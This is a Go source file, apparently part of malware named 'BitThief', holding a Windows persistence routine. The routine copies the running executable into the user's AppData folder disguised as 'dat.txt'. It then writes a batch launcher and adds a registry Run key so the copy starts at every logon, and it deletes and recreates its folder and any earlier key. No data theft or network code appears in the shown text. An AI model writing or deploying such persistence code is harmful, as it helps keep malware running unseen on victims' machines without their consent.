package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
)

func AddStartup() error {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return fmt.Errorf("APPDATA environment variable not set")
	}
	workingDir := filepath.Join(appData, "BitThief")

	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}
	realExePath, err := filepath.EvalSymlinks(exePath)
	if err != nil {
		return fmt.Errorf("failed to evaluate symlinks: %w", err)
	}

	datTxtPath := filepath.Join(workingDir, "dat.txt")
	if realExePath == datTxtPath {
		return nil
	}

	if _, err := os.Stat(workingDir); os.IsNotExist(err) {
		if err = os.Mkdir(workingDir, 0755); err != nil {
			return fmt.Errorf("failed to create directory: %w", err)
		}
	} else {
		if err = os.RemoveAll(workingDir); err != nil {
			return fmt.Errorf("failed to remove existing directory: %w", err)
		}
		if err = os.Mkdir(workingDir, 0755); err != nil {
			return fmt.Errorf("failed to recreate directory: %w", err)
		}
	}

	if err = copyFile(realExePath, datTxtPath); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}

	runBatPath := filepath.Join(workingDir, "run.bat")
	batContent := fmt.Sprintf("@echo off\r\ncall \"%s\"\r\n", datTxtPath)
	if err = os.WriteFile(runBatPath, []byte(batContent), 0644); err != nil {
		return fmt.Errorf("failed to write run.bat: %w", err)
	}

	delCmd := exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "BitThief", "/f")
	_ = delCmd.Run()

	addCmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "BitThief", "/t", "REG_SZ", "/d", runBatPath, "/f")
	if err = addCmd.Run(); err != nil {
		return fmt.Errorf("failed to add registry entry: %w", err)
	}

	return nil
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer func() {
		_ = out.Close()
	}()

	if _, err = io.Copy(out, in); err != nil {
		return err
	}

	return out.Sync()
}
